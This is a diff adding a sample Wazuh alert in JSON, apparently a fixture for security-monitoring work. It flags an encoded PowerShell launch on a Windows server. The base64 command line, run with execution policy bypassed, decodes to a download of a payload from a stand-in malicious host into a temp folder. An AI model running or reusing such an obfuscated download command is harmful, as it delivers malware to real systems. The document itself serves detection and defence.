@@ -1,0 +1,56 @@
+{
+  "id": "1706000002.223344",
+  "timestamp": "2024-01-24T04:05:18.000+0000",
+  "rule": {
+    "level": 12,
+    "description": "Suspicious PowerShell Encoded Command Execution",
+    "id": "92201",
+    "mitre": {
+      "attack": ["T1059.001", "T1027"],
+      "tactic": ["Execution", "Defense Evasion"],
+      "technique": ["PowerShell", "Obfuscated Files or Information"]
+    },
+    "groups": [
+      "windows",
+      "win_ms_powershell",
+      "process_creation",
+      "suspicious_powershell"
+    ]
+  },
+  "agent": {
+    "id": "003",
+    "name": "CORP-WIN-SRV02",
+    "ip": "10.10.10.50"
+  },
+  "manager": {
+    "name": "wazuh-manager-01"
+  },
+  "full_log": "WinEvtLog: Microsoft-Windows-Sysmon/Operational: (1): Process Create: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQByAHQAdgBtAGcAdgBjAGkAdwBnAHEALgBtAGEAbABpAGMAaQBvAHUAcwBzAGkAdABlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHMAYwBoAGUAZAB1AGwAZQBkAHQAYQBzAGsALgBlAHgAZQA= User: CORP\\jsmith ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: cmd.exe /c powershell.exe -enc ... ProcessId: 4812 ParentProcessId: 3200",
+  "data": {
+    "win": {
+      "system": {
+        "eventID": "1",
+        "computer": "CORP-WIN-SRV02"
+      },
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQByAHQAdgBtAGcAdgBjAGkAdwBnAHEALgBtAGEAbABpAGMAaQBvAHUAcwBzAGkAdABlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHMAYwBoAGUAZAB1AGwAZQBkAHQAYQBzAGsALgBlAHgAZQA=",
+        "processName": "powershell.exe",
+        "parentProcessName": "cmd.exe",
+        "parentCommandLine": "cmd.exe /c powershell.exe -enc ...",
+        "targetUserName": "jsmith",
+        "ipAddress": "10.10.10.50",
+        "processId": "4812",
+        "parentProcessId": "3200",
+        "hashes": "MD5=a7f24e8b3c1d9056f2e8a3b4c5d6e7f8,SHA256=3a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f678"
+      }
+    },
+    "dstip": "198.51.100.45",
+    "srcip": "10.10.10.50",
+    "dstuser": "SYSTEM"
+  },
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "location": "EventChannel"
+}
